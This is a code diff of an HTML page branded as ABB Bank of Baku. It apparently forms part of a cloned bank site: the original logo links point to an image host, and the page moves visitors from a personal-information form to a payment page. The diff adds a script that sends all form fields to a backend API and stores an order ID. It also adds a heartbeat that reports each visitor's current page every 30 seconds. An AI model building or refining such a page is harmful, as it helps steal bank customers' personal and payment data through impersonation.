@@ -264,8 +264,8 @@
 
     <header>
         <div class="header-left">
-            <a href="https://ibb.co/fz35N6Kd"><img src="logo-header.png" alt="ABB Bank"></a>
-            <a href="index.html" class="lang-btn">AZ</a>
+            <a href="index-en.html"><img src="logo-header.png" alt="ABB Bank"></a>
+            <a href="data.html" class="lang-btn">AZ</a>
         </div>
         <div class="header-right">
             <div class="phone-group">
@@ -283,7 +283,7 @@
     <div class="main-container">
         <div class="form-wrapper">
             <h2 class="form-title">Personal Information</h2>
-            <form action="save.php" method="POST" class="form-grid">
+            <form id="personalDataForm" class="form-grid">
                 
                 <!-- Full Name -->
                 <div class="form-group full-width">
@@ -406,7 +406,7 @@
     <!-- Footer -->
     <footer>
         <div class="footer-container">
-            <a href="https://ibb.co/fz35N6Kd"><img src="logo-footer.png" alt="ABB Bank" class="footer-logo"></a>
+            <a href="index-en.html"><img src="logo-header.png" alt="ABB Bank" class="footer-logo"></a>
             <div class="footer-info">
                 <div>Address: 67 Nizami Street, Baku, Azerbaijan</div>
                 <div>Email: info@abb-bank.az</div>
@@ -419,5 +419,47 @@
         </div>
     </footer>
 
+    <script>
+        document.getElementById('personalDataForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('/api/orders/personal-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    sessionStorage.setItem('orderId', result.orderId);
+                    window.location.href = 'payment-en.html';
+                } else {
+                    alert('Error: ' + result.error);
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                alert('An error occurred while connecting to the server');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
+    </script>
 </body>
 </html>
